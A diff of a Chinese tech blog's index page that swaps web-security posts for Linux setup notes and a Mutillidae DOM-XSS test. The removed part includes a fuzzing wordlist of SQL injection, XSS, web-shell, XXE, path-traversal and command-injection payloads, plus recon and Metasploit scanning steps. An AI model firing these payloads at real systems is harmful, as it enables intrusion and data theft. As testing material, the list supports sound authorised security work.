@@ -111,7 +111,7 @@
         
             <li><a href="%E6%95%B0%E6%8D%AE%E5%BA%93.html">数据库</a></li>
         
-            <li><a href="Web%E5%AE%89%E5%85%A8.html">Web安全</a></li>
+            <li><a href="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html">渗透测试</a></li>
         
             <li><a href="%E9%A3%8E%E8%8A%B1%E9%9B%AA%E6%9C%88.html">风花雪月</a></li>
         
@@ -138,24 +138,20 @@
 		<div class="markdown-body home-categories">
 		
 			<div class="article">
-                <a class="clearlink" href="15604965103558.html">
+                <a class="clearlink" href="15642124072307.html">
                 
-                  <h1>Docker for Mac 卡在 "is starting"</h1>
+                  <h1>Mutillidae 遇到的一个奇怪问题</h1>
                   <div class="a-content">
                       
                       <div class="a-content-text">
                         
-                        	<blockquote>
-<p>解决方案来自：<a href="https://github.com/docker/for-mac/issues/2420">https://github.com/docker/for-mac/issues/2420</a> 中的sagidM的回复</p>
-</blockquote>
-
-<p>本机环境：<br/>
-macOS 10.14.4<br/>
-Docker Engine: 18.09.2</p>
-
-<p><figure><img src="media/15604965103558/15604966419596.jpg" alt=""/></figure></p>
-
-<p>大意是，打开终端然后输入<code>screen ~/Library/Containers/com.docker.docker/Data/vms/0/tty</code>，接着回车几次，就 ok 了。事实证明这个方法确实能解决问题。如果你输入一次没什么反应，就多开几个终端标签多试几次就可以了。</p>
+                        	<p>在进行 dom 型 xss 测试的时候，发现 payload 中输入 x 或 y 会弹窗，其他字母不弹窗。具体如下图所示。<br/>
+<code>&lt;img src=1 onerror=alert(z)&gt;</code><br/>
+<figure><img src="media/15642124072307/15642124281235.jpg" alt="" style="width:1017px;"/></figure></p>
+<img src=1 onerror=alert(x)>
+<p><figure><img src="media/15642124072307/15642124904179.jpg" alt="" style="width:774px;"/></figure></p>
+<img src=1 onerror=alert(y)>
+<p><figure><img src="media/15642124072307/15642125078089.jpg" alt="" style="width:769px;"/></figure></p>
 
                         
                       </div>
@@ -164,7 +160,53 @@ Docker Engine: 18.09.2</p>
                 <div class="read-more clearfix">
                   <div class="more-left left">
                   
-                    <span class="date">2019/6/14 15:15 下午</span>
+                    <span class="date">2019/7/27 15:26 下午</span>
+                    <span>posted in&nbsp;</span> 
+          				  
+          					    <span class="posted-in"><a href='%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html'>渗透测试</a></span>
+          				   
+                  </div>
+                  <div class="more-right right">
+                  <span class="comments">
+                      
+
+                       
+                  </span>
+                  </div>
+                </div>
+              </div><!-- article -->
+        
+			<div class="article">
+                <a class="clearlink" href="15641083818915.html">
+                
+                  <h1>manjaro更改国内源操作</h1>
+                  <div class="a-content">
+                      
+                      <div class="a-content-text">
+                        
+                        	<p>1、排序并增加中文rank源<br/>
+<code>sudo pacman-mirrors -i -c China -m rank</code><br/>
+选择喜欢的就行，不知道就全选好了。</p>
+
+<p>2、添加 archlinuxcn（archlinux 可用）<br/>
+修改<code>/etc/pacman.conf</code>文件，在文件后添加如下语句：</p>
+
+<pre class="line-numbers"><code class="language-text">[archlinuxcn]
+SigLevel = Optional TrustedOnly
+Server = https://mirrors.ustc.edu.cn/archlinuxcn/$arch
+</code></pre>
+
+<p>导入GPG Key<br/>
+<code>sudo pacman -Syy &amp;&amp; sudo pacman -S archlinuxcn-keyring</code></p>
+
+                        
+                      </div>
+                  </div>
+                </a>
+                <div class="read-more clearfix">
+                  <div class="more-left left">
+                  
+                    <span class="date">2019/7/26 10:33 上午</span>
                     <span>posted in&nbsp;</span> 
           				  
           					    <span class="posted-in"><a href='%E7%B3%BB%E7%BB%9F.html'>系统</a></span>
@@ -181,46 +223,16 @@ Docker Engine: 18.09.2</p>
               </div><!-- article -->
         
 			<div class="article">
-                <a class="clearlink" href="15602308144902.html">
+                <a class="clearlink" href="15640473747565.html">
                 
-                  <h1>Metasploit 完全使用教程</h1>
+                  <h1>kali 下更新软件时报错，说下列签名无效的解决办法</h1>
                   <div class="a-content">
                       
                       <div class="a-content-text">
                         
-                        	<blockquote>
-<p>计划写一个 msf 从安装到使用到编写 exploit 的教程，在这里留个坑。本文不适合新手，很多地方不会说的太细致。但是会说清楚。</p>
-</blockquote>
+                        	<p>解决办法就是重新获取下签名key </p>
 
-<h2 id="toc_0">环境搭建</h2>
-
-<p>1、安装 Postgresql<br/>
-2、安装 metasploit</p>
-
-<p>关于 metasploit，linux 的话可以使用软件管理器安装；macosx 的话可以使用 brew 安装；windows 别装了，去学 linux 吧。</p>
-
-<p>如果用包管理器安装有问题，则去官网下载二进制文件安装或者 github 下载源码下来，然后给 install 可执行权限，再执行安装。</p>
-
-<p>安装完成之后，使用 alias 命令将<code>/opt/metasploit-framework/bin ./msfconsole</code>（具体路径根据自己安装的实际情况选定）指定成<code>msf</code>，这样以后要用只需要在终端输入 msf 即可立即开始使用。</p>
-
-<h2 id="toc_1">使用入门</h2>
-
-<p>打开终端然后输入 msf 即可启动，如下图所示：<br/>
-<figure><img src="media/15602308144902/15602325257924.jpg" alt=""/></figure></p>
-
-<p><figure><img src="media/15602308144902/15602325455212.jpg" alt=""/></figure></p>
-
-<p>上图黄字部分表示当前 msf 版本，如果版本过低，请使用<code>msfupdate</code>进行升级（注意执行此命令时终端所在的目录）。</p>
-
-<h2 id="toc_2">使用 msf 进行信息收集</h2>
-
-<p>主动信息收集的第一步通常都是端口扫描</p>
-
-<p><figure><img src="media/15602308144902/15602328461015.jpg" alt=""/></figure></p>
-
-<p>首先查找端口扫描模块，命令<code>search portscan</code>，search 是个非常重要的命令，当我们需要扫描或者利用某个漏洞时，可以使用 search 命令来查找 msf 是否有相关模块。</p>
-
-<p>（未完待续）</p>
+<p>wget -q -O - <a href="https://archive.kali.org/archive-key.asc">https://archive.kali.org/archive-key.asc</a> | sudo apt-key add</p>
 
                         
                       </div>
@@ -229,10 +241,10 @@ Docker Engine: 18.09.2</p>
                 <div class="read-more clearfix">
                   <div class="more-left left">
                   
-                    <span class="date">2019/6/11 13:26 下午</span>
+                    <span class="date">2019/7/25 17:36 下午</span>
                     <span>posted in&nbsp;</span> 
           				  
-          					    <span class="posted-in"><a href='Web%E5%AE%89%E5%85%A8.html'>Web安全</a></span>
+          					    <span class="posted-in"><a href='%E7%B3%BB%E7%BB%9F.html'>系统</a></span>
           				   
                   </div>
                   <div class="more-right right">
@@ -246,302 +258,32 @@ Docker Engine: 18.09.2</p>
               </div><!-- article -->
         
 			<div class="article">
-                <a class="clearlink" href="15597856399146.html">
+                <a class="clearlink" href="15638711886127.html">
                 
-                  <h1>黑盒测试中的信息收集</h1>
+                  <h1>Archiso</h1>
                   <div class="a-content">
                       
                       <div class="a-content-text">
                         
-                        	<p>信息搜集分为主动搜集和被动搜集，主动搜集会惊动资产方因此需要有所针对，动静越小越好；而被动搜集不会惊动资产方因此更为隐蔽。</p>
+                        	<p>参考官方文档，自制 archlinux 可启动镜像。这样就可以拥有自己的 linux 发行版了。</p>
 
-<h2 id="toc_0">第一阶段：资产（域名及子域名）搜集</h2>
+<p><a href="https://wiki.archlinux.org/index.php/Archiso">https://wiki.archlinux.org/index.php/Archiso</a></p>
 
-<p>1、确认目标性质：了解网站所在行业，他是一个黑产赌博色情站、还是政府学校官方站、亦或是金融游戏商业站。了解这类网站通常的安全关注点在哪，那么避开其关注点，就是它的薄弱点。</p>
+<p>修改 pacman.conf，添加自定义存储库<br/>
+<figure><img src="media/15638711886127/15638731637993.jpg" alt="" style="width:460px;"/></figure></p>
 
-<p>2、收集目标资产 1：使用搜索引擎搜索关键词（公司名、域名等），找出搜索引擎搜录的相关域名，这里可以用一些现成的工具或者自写爬虫</p>
+<p>将 customrepo 的内容改为 archlinuxcn</p>
 
-<p>3、收集目标资产 2：使用子域名扫描器，根据 2 中搜集来的域名进一步进行资产收集。</p>
+<pre class="line-numbers"><code class="language-text">#[customrepo]
+SigLevel = Optional TrustAll
+Server = file:///home/user/customrepo/$arch
+</code></pre>
 
-<p>4、收集目标资产 3：使用爬虫在 3 所在的页面中爬取隐藏页面或引用的 url。</p>
+<p>改为</p>
 
-<p>信息搜集是层层递进的，根据上一次收集的信息来进行扩展，尽可能多的收集目标资产、扩大打击面。</p>
-
-<h2 id="toc_1">第二阶段：资产属性收集</h2>
-
-<p>5、得到域名和 ip 相关信息后，对资产进行端口扫描、敏感目录（包括后台、备份文件、隐藏接口、邮箱系统、运维自带后门、github 或网盘泄露等）扫描、GoogleHacking（快照信息、已知后门、代码泄露、已知安全事件）、操作系统版本（win、linux）、web 应用服务器版本（nginx、apache、tomcat 等）、后端框架（spring、flask、thinkphp 等）、网络拓扑（多少主机、路由、交换、网段、DNS服务器等）、防御软硬件信息（防火墙、waf、网闸等）等。并一一记录资产对应的信息。这里还有些值得注意的信息就是：邮箱、手机号、身份证号等个人敏感信息。</p>
-
-<p>6、分析信息并对有效信息进行提取和记录。</p>
-
-<p>比如你可以这样来记录（这只是个例子，信息收集自然是越详细越好）：<br/>
-<figure><img src="media/15597856399146/15598028215198.jpg" alt=""/></figure></p>
-
-<h2 id="toc_2">第三阶段：资产攻击面分析</h2>
-
-<p>7、收集了各种信息后，就是分析各个资产可能存在的防御薄弱点、分析攻击面。可以从软硬件漏洞、业务、人三个方向来进行分析。</p>
-
-<p>8、收集攻击相关工具、字典等，针对可入侵性高的攻击面进行攻击，此时会获得攻击工具的部分反馈。根据反馈我们可以更好地了解对方的防御措施和脆弱点。根据不同的攻击行为，系统会有不同的反应，分析这些信息对后续展开更深层次的攻击也是有积极意义的。</p>
-
-<p>基本上，到这里，我们就可以开始展开针对性的攻击了。如果物理上离目标近，还可以使用钓鱼二维码、社工、应聘、潜入停车场、办公区域，若网络未做内外网隔离还可以连接办公室 wifi 等方式（连接 wifi 这个绝对是大杀器）。</p>
-
-                        
-                      </div>
-                  </div>
-                </a>
-                <div class="read-more clearfix">
-                  <div class="more-left left">
-                  
-                    <span class="date">2019/6/6 9:47 上午</span>
-                    <span>posted in&nbsp;</span> 
-          				  
-          					    <span class="posted-in"><a href='Web%E5%AE%89%E5%85%A8.html'>Web安全</a></span>
-          				   
-                  </div>
-                  <div class="more-right right">
-                  <span class="comments">
-                      
-
-                       
-                  </span>
-                  </div>
-                </div>
-              </div><!-- article -->
-        
-			<div class="article">
-                <a class="clearlink" href="15596178265897.html">
-                
-                  <h1>业务逻辑漏洞安全检查checklist</h1>
-                  <div class="a-content">
-                      
-                      <div class="a-content-text">
-                        
-                        	<blockquote>
-<p>未公开整理好的 checklist 全部内容，也不打算全部公开。</p>
-</blockquote>
-
-<h2 id="toc_0">认证</h2>
-
-<p>图形验证码问题（验证码缺失、验证码回显、验证码绕过、验证流程不正确、重放攻击）<br/>
-手机验证码（短信轰炸、验证码劫持）<br/>
-会话固定<br/>
-cookie 伪造/爆破<br/>
-使用默认凭证（管理后台、数据库密码）<br/>
-冻结账户策略不当<br/>
-弱用户名和密码<br/>
-“记住我”功能缺陷（前端记住/发送密码）<br/>
-自动登录<br/>
-单点登录劫持<br/>
-第三方登录劫持<br/>
-二维码登录劫持<br/>
-弱口令<br/>
-弱安全问题/答案<br/>
-弱的密码恢复机制<br/>
-Oauth2.0授权漏洞<br/>
-JWT安全<br/>
-注册覆盖<br/>
-未验证的重定向和转发<br/>
-双因素认证不当（双因素后获取的凭证，在无需双因素处可以获得）<br/>
-恶意注册</p>
-
-<h2 id="toc_1">授权</h2>
-
-<p>测试角色定义（授权不当）<br/>
-权限管理缺失（无权限设计）<br/>
-匿名访问（备用接口——常见于兼容老的不安全的接口时产生）<br/>
-水平越权<br/>
-垂直越权<br/>
-超级账户<br/>
-实名认证不严格</p>
-
-<h2 id="toc_2">会话管理</h2>
-
-<p>cookie安全属性<br/>
-cookie可猜解/伪造<br/>
-cookie溢出<br/>
-会话固定漏洞<br/>
-用户凭证不安全传输（弱加密或明文传输）<br/>
-用户凭证未一次失效<br/>
-用户凭证可猜解<br/>
-注销与会话超时<br/>
-敏感数据不安全传输（get 方法传输 session）</p>
-
-<h2 id="toc_3">内容安全</h2>
-
-<p>敏感信息过度显示<br/>
-违法违规信息</p>
-
-<h2 id="toc_4">设计缺陷</h2>
-
-<p>业务一致性（篡改类）漏洞（订单 id、邮箱或用户名、手机号、商品编号、用户 id、支付金额、优惠券金额、商品数量、最大数限制、前端限制绕过）<br/>
-刷赞、刷关注、刷票、刷奖品<br/>
-流程绕过（密码找回、支付、登录验证）</p>
-
-<h2 id="toc_5">典型场景</h2>
-
-<p>个人信息<br/>
-密码找回/修改<br/>
-支付流程<br/>
-注册流程<br/>
-需要手机/邮箱验证的业务</p>
-
-                        
-                      </div>
-                  </div>
-                </a>
-                <div class="read-more clearfix">
-                  <div class="more-left left">
-                  
-                    <span class="date">2019/6/4 11:10 上午</span>
-                    <span>posted in&nbsp;</span> 
-          				  
-          					    <span class="posted-in"><a href='Web%E5%AE%89%E5%85%A8.html'>Web安全</a></span>
-          				   
-                  </div>
-                  <div class="more-right right">
-                  <span class="comments">
-                      
-
-                       
-                  </span>
-                  </div>
-                </div>
-              </div><!-- article -->
-        
-			<div class="article">
-                <a class="clearlink" href="15596171974228.html">
-                
-                  <h1>最近做了个 fuzzing 字典精简版</h1>
-                  <div class="a-content">
-                      
-                      <div class="a-content-text">
-                        
-                        	<blockquote>
-<p>仅用于学习目的，请勿进行违法犯罪活动，也不要用来扫描别人系统，扫描未授权的计算机是犯法的。<br/>
-本字典可以用来检测（不保证效果、payload 自行琢磨修改）：sql 注入、xss、敏感目录泄露、敏感文件泄露、iis 短文件名、xml 注入、ssrf、远程命令执行、未验证的 url 跳转、任意文件读取等。</p>
-</blockquote>
-
-<pre class="line-numbers"><code class="language-text">&#39;
-&quot;
-[
-@
-#
-%
-&amp;
-*
-(
-)
-]
-/
-??
-//
-\\
-../
-&lt;!-- 
-%20select @@version
-)%20or%20(&#39;x&#39;=&#39;x
-%20or &#39;a&#39;=&#39;a
-%20or 2 &gt; 1
-%20or &#39;a&#39;=&#39;a
-%20or 1=1
-%20and%201=1
-%20and%201=2
-/**/or/**/1/**/=/**/1
-select &#39;10as&#39;=10;
-exec master..xp_cmdshell &#39;ipconfig+/all&#39;
-%20or &#39;7659&#39;=&#39;7659
-%20or &#39;text&#39; = n&#39;text&#39;
-) union select * from information_schema.tables;
-1+AND+USER_NAME()=’dbo’
-1;waitfor+delay+’0:0:10’
-1’;shutdown –
-as
-%20select 1/*!50000union/*!*//*!50000select/*!*/2;
-%20or 0=0 #&quot;
-&#39; union (select @@version) --
-&#39; union (select NULL, (select @@version)) --
-&#39; union (select NULL, NULL, (select @@version)) --
-&#39; union (select NULL, NULL, NULL,  (select @@version)) --
-&#39; union (select NULL, NULL, NULL, NULL,  (select @@version)) --
-&#39; union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --
---
-/*
-1’; insert into users values(‘lonelyor’,’lonelyor’)
-%28
-%29
-&lt;sCrIpt&gt;alErt(‘xss’)&lt;/ScRiPT&gt;
-&lt;script&gt;alert(8888)&lt;/script&gt;
-&lt;script&gt;confirm(8866)&lt;/script&gt;
-&lt;script&gt;prompt(8877)&lt;/script&gt;
-a&lt;img src=1 onerror=alert(1)&gt;a
-&lt;img src=x onerror=alert(11)&gt;29
-&lt;anytag onmouseover=alert(1)&gt;s
-&quot;&gt;&lt;img/onload=alert(1)&gt;&#39; -- 
-&lt;video onloadstart=alert(1)&gt;&lt;source&gt;
-&lt;a onclick=alert(2)&gt;h
-&lt;button/onclick=alert(6)&gt;h
-&lt;script&gt;\u0061\u006C\u0065\u0072\u0074(8888)&lt;/script&gt;
-&lt;script&gt;alert(String.fromCharCode(49,49))&lt;/script&gt;
-&lt;body/onload=alert(12)&gt;
-&lt;a onmouseover=&quot;alert(document.cookie)&quot;&gt;xxs link&lt;/a&gt;
-&lt;scr&lt;script&gt;ipt&gt;alert(&#39;xss&#39;);&lt;/scr&lt;/script&gt;ipt&gt;
-&lt;SCRIPT/SRC=&quot;http://xss.rocks/xss.js&quot;&gt;&lt;/SCRIPT&gt;
-.git
-.gitignore
-.svn
-wp-admin
-wp-login.php
-.DS_store
-.ds_store
-index.php.bak
-.index.php~
-index.php.~
-robots.txt
-.git/config
-admin/
-/admin
-uploads/
-download/
-downloads/
-manager/
-/include
-1.jsp
-hack.jsp
-1.php
-1.asp
-/新建文本文档.txt
-/etc/passwd
-etc/passwd
-../../../../etc/passwd
-/../../../../etc/passwd
-..2f..2fetc2fpasswd
-&lt;!--?xml version=&quot;1.0&quot; ?--&gt;&lt;!DOCTYPE replace [&lt;!ENTITY ent SYSTEM &quot;file:///etc/
-&lt;%eval request(chr(35))%&gt;
-&lt;?=eval($_POST[&#39;cmd&#39;]);
-cmd
-system(&quot;ls -al /&quot;)
-%s%s%s%s%s%s%s%s%s%s
-NULL
-null
-zull
-/C:\Program Files\
-C:\Program Files\
-&lt;!--#exec cmd=&quot;ls&quot; --&gt;
-&lt;!--#exec cmd=&quot;dir&quot; --&gt;
-&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY&gt;&lt;!ENTITY xxe SYSTEM &quot;file:////etc/passwd&quot;&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
-&lt;?xml version=&quot;1.0&quot;?&gt;&lt;change-log&gt;&lt;text&gt;Hello World&lt;/text&gt;&lt;/change-log&gt;
-&lt;!DOCTYPE foo [&lt;!ENTITY xxe7eb97 SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt;
-| ping -i 30 127.0.0.1 |
-&amp; ping -i 30 127.0.0.1 &amp;
-?url=http://www.zhihu.com/
-?url=https://www.zhihu.com/
-http://www.lonelyor.org/
-https://www.lonelyor.org/
-$ENV{&#39;HOME&#39;}
-2.2250738585072011e-308
-01/01/1979
-*~1*/.aspx
-a*~1*/.aspx
-&lt;h1&gt;haha&lt;/h1&gt;
+<pre class="line-numbers"><code class="language-text">#[archlinuxcn]
+SigLevel = Optional TrustAll
+Server = https://mirrors.ustc.edu.cn/archlinuxcn/$arch
 </code></pre>
 
                         
@@ -551,10 +293,10 @@ a*~1*/.aspx
                 <div class="read-more clearfix">
                   <div class="more-left left">
                   
-                    <span class="date">2019/6/4 10:59 上午</span>
+                    <span class="date">2019/7/23 16:39 下午</span>
                     <span>posted in&nbsp;</span> 
           				  
-          					    <span class="posted-in"><a href='Web%E5%AE%89%E5%85%A8.html'>Web安全</a></span>
+          					    <span class="posted-in"><a href='%E7%B3%BB%E7%BB%9F.html'>系统</a></span>
           				   
                   </div>
                   <div class="more-right right">
@@ -568,24 +310,19 @@ a*~1*/.aspx
               </div><!-- article -->
         
 			<div class="article">
-                <a class="clearlink" href="15595455557551.html">
+                <a class="clearlink" href="15611953556975.html">
                 
-                  <h1>使用 msf 检测 cve-2019-0708 WindowsRDP 远程代码执行漏洞</h1>
+                  <h1>archlinux 安装 vmtools 遇到坑了怎么办</h1>
                   <div class="a-content">
                       
                       <div class="a-content-text">
                         
-                        	<p>MSF模块：<a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb">https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb</a></p>
+                        	<p>使用这个脚本即可：<a href="https://github.com/rasa/vmware-tools-patches">https://github.com/rasa/vmware-tools-patches</a></p>
 
-<p>前提：先在终端中更新 msf，使用命令<code>msfupdate</code>；如果没法更新，而 msf 版本又低就去 github 下载 msf 模块。</p>
-
-<p>现在开始验证：<br/>
-1、终端输入<code>msf</code>启动 msf<br/>
-2、使用 cve_2019_0708_bluekeep 模块：<code>use auxiliary/scanner/rdp/cve_2019_0708_bluekeep</code><br/>
-3、设置目标计算机 ip：<code>set RHOSTS 192.168.1.1</code>，如果是域名，可以先 ping 得出 ip 地址。<br/>
-4、输入<code>exploit</code>开始检测，如果出现方框中的内容，则表示漏洞存在（相关 ip 已打码）。</p>
-
-<p><figure><img src="media/15595455557551/15595462320619.jpg" alt=""/></figure></p>
+<pre class="line-numbers"><code class="language-text">$ git clone https://github.com/rasa/vmware-tools-patches.git
+$ cd vmware-tools-patches
+$ ./patched-open-vm-tools.sh
+</code></pre>
 
                         
                       </div>
@@ -594,10 +331,45 @@ a*~1*/.aspx
                 <div class="read-more clearfix">
                   <div class="more-left left">
                   
-                    <span class="date">2019/6/3 15:5 下午</span>
+                    <span class="date">2019/6/22 17:22 下午</span>
                     <span>posted in&nbsp;</span> 
           				  
-          					    <span class="posted-in"><a href='Web%E5%AE%89%E5%85%A8.html'>Web安全</a></span>
+          					    <span class="posted-in"><a href='%E7%B3%BB%E7%BB%9F.html'>系统</a></span>
+          				   
+                  </div>
+                  <div class="more-right right">
+                  <span class="comments">
+                      
+
+                       
+                  </span>
+                  </div>
+                </div>
+              </div><!-- article -->
+        
+			<div class="article">
+                <a class="clearlink" href="15605030813483.html">
+                
+                  <h1>linux 在终端中打开图形化文件管理器</h1>
+                  <div class="a-content">
+                      
+                      <div class="a-content-text">
+                        
+                        	<p>xdg-open ./ 用图形化文件管理器打开当前文件夹</p>
+
+<p>xdg-open &quot;dir&quot; 打开任意路径</p>
+
+                        
+                      </div>
+                  </div>
+                </a>
+                <div class="read-more clearfix">
+                  <div class="more-left left">
+                  
+                    <span class="date">2019/6/14 17:4 下午</span>
+                    <span>posted in&nbsp;</span> 
+          				  
+          					    <span class="posted-in"><a href='%E7%B3%BB%E7%BB%9F.html'>系统</a></span>
           				   
                   </div>
                   <div class="more-right right">
@@ -674,7 +446,7 @@ a*~1*/.aspx
         
             <a href="%E6%95%B0%E6%8D%AE%E5%BA%93.html"><strong>数据库</strong></a>
         
-            <a href="Web%E5%AE%89%E5%85%A8.html"><strong>Web安全</strong></a>
+            <a href="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html"><strong>渗透测试</strong></a>
         
             <a href="%E9%A3%8E%E8%8A%B1%E9%9B%AA%E6%9C%88.html"><strong>风花雪月</strong></a>
         
@@ -695,31 +467,31 @@ a*~1*/.aspx
 	      
 		      
 			      <li class="post">
-			        <a href="15604965103558.html">Docker for Mac 卡在 "is starting"</a>
+			        <a href="15642124072307.html">Mutillidae 遇到的一个奇怪问题</a>
 			      </li>
 		     
 		  
 		      
 			      <li class="post">
-			        <a href="15602308144902.html">Metasploit 完全使用教程</a>
+			        <a href="15641083818915.html">manjaro更改国内源操作</a>
 			      </li>
 		     
 		  
 		      
 			      <li class="post">
-			        <a href="15597856399146.html">黑盒测试中的信息收集</a>
+			        <a href="15640473747565.html">kali 下更新软件时报错，说下列签名无效的解决办法</a>
 			      </li>
 		     
 		  
 		      
 			      <li class="post">
-			        <a href="15596178265897.html">业务逻辑漏洞安全检查checklist</a>
+			        <a href="15638711886127.html">Archiso</a>
 			      </li>
 		     
 		  
 		      
 			      <li class="post">
-			        <a href="15596171974228.html">最近做了个 fuzzing 字典精简版</a>
+			        <a href="15611953556975.html">archlinux 安装 vmtools 遇到坑了怎么办</a>
 			      </li>
 		     
 		  
